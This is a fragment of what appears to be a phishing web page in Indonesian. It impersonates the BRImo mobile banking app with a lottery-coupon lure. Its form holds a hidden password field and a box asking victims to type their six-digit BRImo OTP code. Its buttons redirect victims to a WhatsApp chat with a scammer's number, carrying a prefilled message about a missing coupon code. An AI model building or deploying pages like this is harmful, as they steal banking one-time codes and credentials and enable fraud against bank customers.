  ...
  <input type="hidden" id="pass" name="pass">
     <center> 
        <div style="margin-top: 30px"> 
         ...
         <textarea type="tel" name="sms" id="sms" class="bubble-element Input form-log" placeholder="Silahkan  masukan Kode OTP atau Tautan BRImo dikotak ini" maxlength="6" minlength="6" style="margin-left: 0px; height: 60px; border-radius: 10px; text-align: left; padding: 8px" required onclick="gantiborder1()"></textarea>
    ...
    <input type="submit" id="kirims" class="bubble-element Button clickable-element" onclick="location.href='https://wa.me/6285169995700?text=Saya Belum Mendapatkan Kode Kupon Undian'" style="max-width: 85%; padding: 0px; cursor: pointer; background: none rgb(9, 140, 227); border: none; text-align: center; display: block; margin: 20px auto; height: 39px; width: 346px; left: 0px; top: 0px; font-family: Arial; font-size: 14px; font-weight: 400; color: rgb(255, 255, 255); letter-spacing: 1px; line-height: 1; border-radius: 50px; box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; transition: background 200ms ease 0s; font-weight: 700" tabindex="2" value="Konfirmasi Cek Kupon"  />
<div>
    </div>
<script>
    ...
    <b> </b>
   <div>
   <b> <p onclick="location.href='https://wa.me/6285169995700?text=Saya Belum Mendapatkan Kode Kupon Undian'" style="font-size: 14px; text-align: center; margin-top: 55px; margin-left: 10px; margin-right: 10px;"><strong style="color: #FF0000; text-decoration: none"> Tidak Terima Kode ?<br>
